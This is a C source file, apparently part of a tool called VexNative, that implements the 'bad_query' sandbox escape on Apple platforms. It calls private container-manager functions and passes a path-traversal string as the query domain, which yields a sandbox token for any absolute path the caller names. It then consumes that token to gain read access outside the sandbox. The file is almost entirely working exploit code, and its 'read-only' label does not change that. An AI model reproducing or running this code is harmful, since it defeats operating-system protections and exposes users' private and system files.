// VexNative v0.13.6 read-only bad_query stage diagnostics.
// Technique reference: https://github.com/forcequitOS/bad_query
// No write/delete/rename/enumeration primitives are exposed here.

#include <dlfcn.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <xpc/xpc.h>

typedef void *(*q_create_fn)(void);
typedef void (*q_set_class_fn)(void *, uint64_t);
typedef void (*q_set_ids_fn)(void *, xpc_object_t);
typedef void (*q_set_flags_fn)(void *, uint64_t);
typedef void (*q_set_part_fn)(void *, uint64_t);
typedef void (*q_set_domain_fn)(void *, const char *);
typedef void *(*q_get_result_fn)(void *);
typedef void (*q_free_fn)(void *);
typedef char *(*copy_token_fn)(void *);
typedef int64_t (*consume_fn)(const char *);
typedef int (*release_fn)(int64_t);

enum {
    VEX_STAGE_INPUT = 1,
    VEX_STAGE_DLOPEN = 2,
    VEX_STAGE_SYMBOLS = 3,
    VEX_STAGE_QUERY = 4,
    VEX_STAGE_IDENTIFIER = 5,
    VEX_STAGE_DOMAIN = 6,
    VEX_STAGE_RESULT = 7,
    VEX_STAGE_TOKEN = 8,
    VEX_STAGE_CONSUME = 9
};

int64_t vex_bad_query_grant_read_stage(const char *path, int32_t *stage_out) {
    if (stage_out) *stage_out = VEX_STAGE_INPUT;
    if (path == NULL || path[0] != '/') return -255;

    if (stage_out) *stage_out = VEX_STAGE_DLOPEN;
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -1;

    if (stage_out) *stage_out = VEX_STAGE_SYMBOLS;
    q_create_fn q_create = (q_create_fn)dlsym(mgr, "container_query_create");
    q_set_class_fn q_set_class = (q_set_class_fn)dlsym(mgr, "container_query_set_class");
    q_set_ids_fn q_set_ids = (q_set_ids_fn)dlsym(mgr, "container_query_set_group_identifiers");
    q_set_flags_fn q_set_flags = (q_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    q_set_part_fn q_set_part = (q_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    q_set_domain_fn q_set_domain = (q_set_domain_fn)dlsym(mgr, "container_query_operation_set_part_domain");
    q_get_result_fn q_get_result = (q_get_result_fn)dlsym(mgr, "container_query_get_single_result");
    q_free_fn q_free = (q_free_fn)dlsym(mgr, "container_query_free");
    copy_token_fn copy_token = (copy_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    consume_fn consume = (consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

    if (!q_create || !q_set_class || !q_set_ids || !q_set_flags || !q_set_part ||
        !q_set_domain || !q_get_result || !q_free || !copy_token || !consume) {
        dlclose(mgr);
        return -1;
    }

    if (stage_out) *stage_out = VEX_STAGE_QUERY;
    void *query = q_create();
    if (!query) {
        dlclose(mgr);
        return -2;
    }

    if (stage_out) *stage_out = VEX_STAGE_IDENTIFIER;
    q_set_class(query, 13);
    xpc_object_t identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
    if (!identifier) {
        q_free(query);
        dlclose(mgr);
        return -6;
    }
    q_set_ids(query, identifier);
    q_set_part(query, 3);

    if (stage_out) *stage_out = VEX_STAGE_DOMAIN;
    char *domain = NULL;
    if (asprintf(&domain, "../../../../../../../..%s", path) < 0 || !domain) {
        xpc_release(identifier);
        q_free(query);
        dlclose(mgr);
        return -5;
    }
    q_set_domain(query, domain);
    q_set_flags(query, 0x0000008000000000ULL);

    if (stage_out) *stage_out = VEX_STAGE_RESULT;
    void *result = q_get_result(query);
    if (!result) {
        free(domain);
        xpc_release(identifier);
        q_free(query);
        dlclose(mgr);
        return -3;
    }

    if (stage_out) *stage_out = VEX_STAGE_TOKEN;
    char *token = copy_token(result);
    if (!token) {
        free(domain);
        xpc_release(identifier);
        q_free(query);
        dlclose(mgr);
        return -4;
    }

    if (stage_out) *stage_out = VEX_STAGE_CONSUME;
    int64_t handle = consume(token);
    free(token);
    free(domain);
    xpc_release(identifier);
    q_free(query);
    dlclose(mgr);
    return handle;
}

int64_t vex_bad_query_grant_read(const char *path) {
    return vex_bad_query_grant_read_stage(path, NULL);
}

void vex_bad_query_release(int64_t handle) {
    if (handle < 0) return;
    release_fn release_extension = (release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release_extension) release_extension(handle);
}
